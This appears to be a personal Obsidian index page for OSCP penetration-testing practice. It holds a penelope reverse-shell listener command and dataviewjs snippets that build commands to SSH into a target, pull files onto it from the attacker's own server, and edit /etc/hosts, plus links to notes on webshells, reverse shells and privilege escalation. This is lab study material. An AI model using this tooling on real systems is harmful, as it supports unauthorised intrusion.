[[0 Port Number Table]]

[[Terminal Mastery|Kitty]]

Listener

```
cd ~/Desktop/Tools && python3 penelope.py -p 4444 -O / --oscp-safe
```

SSH
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `ssh [user]@${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
wget from local python server
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}:8888/[file]`;

dv.paragraph("```bash\n" + command + "\n```");
```
Clipboard
```
cat huge_payload.txt | xsel --clipboard --input
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `echo "${ip} ${discoveredDomain}" | sudo tee -a /etc/hosts`;

dv.paragraph("```bash\n" + command + "\n```");
```

[[Metasploit]]

---
## Hunting User Machine Access

#### Web
[[Web Requests API]]
[[0000027|URL Webshell]]
[[Synced OSCP Notes/Small Toolkit/Niche Interactions/SPX]]


[[Synced OSCP Notes/Small Toolkit/Little Tricks/Reverse Shell Resources/Reverse Shell Resources|Reverse Shell Resources]]

[[4 Shell Upgrade|Shell Upgrade]]

---
## User Machine Access

[[TMUX]]

[[Synced OSCP Notes/Small Toolkit/Tools/Hashcat|Hashcat]]
[[Synced OSCP Notes/Small Toolkit/Tools/John The Ripper|John The Ripper]]

---
## Hunting Root

#### Priv Esc

[[Search Credentials and Files]]

[[pspy]]

[[Root Methods]]

Wildcard Hijack
[Wildcard Spare Tricks](https://blog.1nf1n1ty.team/hacktricks/linux-hardening/privilege-escalation/wildcards-spare-tricks)


---

## Windows

[[Windows Starter Kit]]

#### Priv Esc

[[SeImpersonatePrivilege]]